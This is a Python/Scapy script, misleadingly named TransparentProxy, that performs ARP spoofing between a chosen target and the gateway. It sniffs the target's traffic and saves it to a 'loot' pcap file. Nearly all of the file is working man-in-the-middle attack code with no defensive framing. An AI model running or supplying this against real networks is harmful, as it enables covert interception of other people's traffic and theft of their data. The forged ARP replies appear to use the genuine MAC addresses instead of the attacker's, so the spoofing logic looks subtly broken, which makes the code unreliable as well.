import signal

from scapy.all import *
from scapy.layers.l2 import ARP, Ether


class TransparentProxy:
    def __init__(self, interface, gateway_ip, target_ip):
        self.interface = interface
        self.my_ip = None
        self.my_mac = None

        self.gateway_ip = gateway_ip
        self.gateway_mac = self.get_mac(self.gateway_ip)

        self.target_ip = target_ip
        self.target_mac = self.get_mac(self.target_ip)

    def get_mac(self, ip_address):
        print("[*] Retrieving MAC address for {}".format(ip_address))

        responses, unanswered = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),
            timeout=2,
            retry=10
        )

        for s, r in responses:
            return r[Ether].src
        return None

    def gen_hash(self):
        import hashlib, time

        epoch_now = time.mktime(time.localtime())
        return hashlib.md5(str(epoch_now).encode()).hexdigest()

    def restore_network(self):
        print("[*] Restoring ARP chache...")

        # send ARP packets with the correct source MAC
        send(
            ARP(
                op=2,
                psrc=self.gateway_ip,
                pdst=self.target_ip,
                hwdst="ff:ff:ff:ff:ff:ff",
                hwsrc=self.gateway_mac
                ), count=5)
        send(
            ARP(
                op=2,
                psrc=self.target_ip,
                pdst=self.gateway_ip,
                hwdst="ff:ff:ff:ff:ff:ff",
                hwsrc=self.target_mac
            ), count=5)

        # signal the main thread to exit
        os.kill(os.getpid(), signal.SIGINT)

    def spoof_packets(self):
        print("[*] Spoofing packets...")

        gateway_packet = ARP()
        gateway_packet.op = 2
        gateway_packet.psrc = self.gateway_ip
        gateway_packet.hwsrc = self.gateway_mac
        gateway_packet.pdst = self.target_ip
        gateway_packet.hwdst = self.target_mac

        print("[*] Created ARP packet -- {{src={0}, dst={1}}}".format(self.gateway_ip, self.target_ip))

        target_packet = ARP()
        target_packet.op = 2
        target_packet.psrc = self.target_ip
        target_packet.hwsrc = self.target_mac
        target_packet.pdst = self.gateway_ip
        target_packet.hwdst = self.gateway_mac

        print("[*] Created ARP packet -- {{src={0}, dst={1}}}".format(self.target_ip, self.gateway_ip))

        return gateway_packet, target_packet

    # This is the point of execution for this lightweight app
    def process_spooftraffic(self):
        def thread_wrapper():
            while True:
                try:
                    gateway_packet, target_packet = self.spoof_packets()
                    send(gateway_packet)
                    send(target_packet)

                    __import__('time').sleep(2)
                except KeyboardInterrupt as keyex:
                    raise keyex
                except Exception as ex:
                    self.restore_network()
                    raise ex

        spoof_thread = None

        try:
            spoof_thread = Thread(target=thread_wrapper)
            spoof_thread.start()
        except KeyboardInterrupt as keyex:
            spoof_thread.join()
            raise keyex
        except Exception as ex:
            spoof_thread.join()
            raise ex

    def sniff_traffic(self):
        try:
            print("[*] Starting packet sniffer...")
            filter = "ip host {0}".format(self.target_ip)
            packets = sniff(count=1000, filter=filter, iface=self.interface)

            loot_filename = 'loot-{}.pcap'.format(self.gen_hash())
            print("[*] Writing sniffed packets to \'{}\'...".format(loot_filename))
            wrpcap(loot_filename, packets)

            self.restore_network()
        except KeyboardInterrupt as keyex:
            self.restore_network()
            raise keyex
        except Exception as ex:
            self.restore_network()
            raise ex
